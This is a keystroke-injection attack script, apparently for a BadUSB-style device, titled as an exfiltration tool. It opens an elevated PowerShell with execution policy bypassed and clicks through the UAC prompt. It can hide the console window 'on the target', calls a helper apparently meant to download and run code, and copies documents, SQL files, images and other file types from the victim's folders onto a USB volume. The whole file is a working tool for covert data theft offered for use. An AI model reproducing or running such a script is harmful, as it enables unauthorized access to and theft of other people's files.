//============================ Mon's Exfil to SD Card Script ================================

// SYNOPSIS
// This script will exfil specified the file types to the chosen storage device


// WARNING
// This script will take a while to run and can use a large amount of storage..

//REQUIREMENTS
// Change VOLUME_NAME to the name of your mounted usb volume.

hide=false; // set to true to hide the console window on the target

layout("us")
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");
delay(8000);
type("Dism /online /Get-Intl");
press("ENTER")
type("Set-WinSystemLocale en-US");
press("ENTER")
type("Set-WinUserLanguageList en-US -Force");
press("ENTER")
delay(1500);

function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(2000);
}

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

if (hide) { hidePS(); }
delay(4000);
assurePS32();
delay(4000);
hidDownAndIEX("1D6B", "1315");

  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'VOLUME_NAME' } | select name\n")   //change VOLUME_NAME to the name of your mounted usb volume.
var filetypes = ["jpg", "png", "txt", "html", "gif", "js", "sql", "docx", "php"]                     // array of filetypes, add filetypes to your liking.
for (var i = 0; i < filetypes.length; i++) {
    type("copy *." + filetypes[i] + " $usbpath.name\n")                           
    type("copy */*." + filetypes[i] + " $usbpath.name\n")                              
    type("copy */*/*." + filetypes[i] + " $usbpath.name\n")                           
    type("copy */*/*/*." + filetypes[i] + " $usbpath.name\n")                      
    type("copy */*/*/*/*." + filetypes[i] + " $usbpath.name\n")                         
    type("copy */*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                  
    type("copy */*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                  
    type("copy */*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                  
    type("copy */*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")             
    type("copy */*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")             
    type("copy */*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")             
    type("copy */*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")           
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")        
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")      
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")     
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}

type("exit");
press("ENTER")